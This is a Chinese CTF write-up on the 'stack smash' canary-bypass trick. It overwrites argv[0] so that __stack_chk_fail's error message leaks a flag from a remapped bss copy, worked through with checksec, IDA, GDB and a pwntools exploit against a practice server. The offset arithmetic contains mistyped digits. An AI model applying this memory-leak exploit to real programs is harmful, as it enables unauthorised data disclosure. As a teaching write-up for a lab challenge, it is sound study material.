# 花样栈溢出技巧 Stack-smash

## 原理

Stack-smash可以绕过Canary保护

正常栈溢出时会连Canary一起覆盖，程序报错，执行`__stack_chk_fail()`将`argv[0]`（程序的第一个参数，也就是程序名）输出。

如果利用栈溢出使argv[0]指向flag，就可以利用Canary报错信息得到flag



> __stack_chl_fail()代码如下：

```c
void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}
void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
}
```



## 题目

> 百度云：https://pan.baidu.com/s/1KnFHzFpMXFKOmBFgsxwB7g	提取码：3gc9



### 检查保护

64位，开启Canary，NX，FORTIFY（这个开的之前还没见过）

```shell
$ checksec --file=smashes
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```



### IDA

拖进IDA64，F5发现main()函数调用sub_4007E0()，进入查看

```c
unsigned __int64 sub_4007E0()
{
  __int64 v0; // rbx
  int v1; // eax
  char v3[264]; // [rsp+0h] [rbp-128h] BYREF
  unsigned __int64 v4; // [rsp+108h] [rbp-20h]

  v4 = __readfsqword(0x28u);
  __printf_chk(1LL, "Hello!\nWhat's your name? ");
  if ( !_IO_gets(v3) )
LABEL_9:
    _exit(1);
  v0 = 0LL;
  __printf_chk(1LL, "Nice to meet you, %s.\nPlease overwrite the flag: ", v3);
  while ( 1 )
  {
    v1 = _IO_getc(stdin);
    if ( v1 == -1 )
      goto LABEL_9;
    if ( v1 == 10 )
      break;
    byte_600D20[v0++] = v1;
    if ( v0 == 32 )
      goto LABEL_8;
  }
  memset((void *)((int)v0 + 6294816LL), 0, (unsigned int)(32 - v0));
LABEL_8:
  puts("Thank you, bye!");
  return __readfsqword(0x28u) ^ v4;
}
```



函数中有俩输入，第一个`!_IO_gets(&v3)`，第二个`_IO_getc(stdin)`，都存在栈溢出漏洞

`_IO_getc(stdin)`将我们的输入赋值给`byte_600D20`，而这个地方存着flag，正常输入会覆盖掉

再看`memset`，函数原型`memset(void * ptr,int value,size_t num)`，其中

- ptr为要操作的内存的指针
- value为要设置的值，可以输入char或int，能根据ASCII相互转换
- num为ptr的前num个字节，size_t为`unsigned int`

题中函数目的是，从`v0+0x600D20LL`这个地址往后`32-v0`字节的内容用0替代



第二个输入会把flag覆盖掉，需要用ELF重映射的特点



### ELF重映射

> 在ELF内存映射时，bss段会被映射两次，可以用另一处地址输出；
>
> 当可执行文件够小，他的不同区段可能会被多次映射；



### GDB

用GDB打开文件，在main函数处下断点，r运行，vmmap查看内存映射

```shell
0x400000           0x401000 r-xp     1000 0      /home/ubuntu/Desktop/smashes
0x600000           0x601000 rw-p     1000 0      /home/ubuntu/Desktop/smashes
```

两次映射分别以0x00600000和0x400000作为起始地址，flag在0x00000d20，所以在内存中为0x00400d20和0x00600d20找到flag



### argv[0]

argv[0]指向程序名，可以直接在GDB中`p & __libc_argv[0]`得到地址



### 寻找栈顶

在IDA中查看gets函数调用的位置

在汇编中看出在call gets之前，程序将参数放在了rdi中，由于mov rdi,rsp的存在，因此gets的参数一开始放在栈里，在gets处下断点，看到当前的栈中rdi寄存器为rsp寄存器的内容，因为64位中rdi放的是当前函数的第一参数，所以当前栈顶的位置到刚才的argv[0]的偏移就是我们的溢出长度，0x7ffffffffdf68-0x7fffffffd50=0x218，也就是输入0x218个内容后把flag地址（0x00400d20）写上就行了



### EXP

```python
#coding=utf8
from pwn import *
context.log_level = 'debug'
p = remote('pwn.jarvisoj.com',9877)
#p=process('./smashes')

payload=b'a'*0x218+p64(0x400d20)
p.sendlineafter('name? ',payload)
p.sendlineafter('flag: ','Cyberangel')#第二次的gets输入任意内容即可
print(p.recv())
```

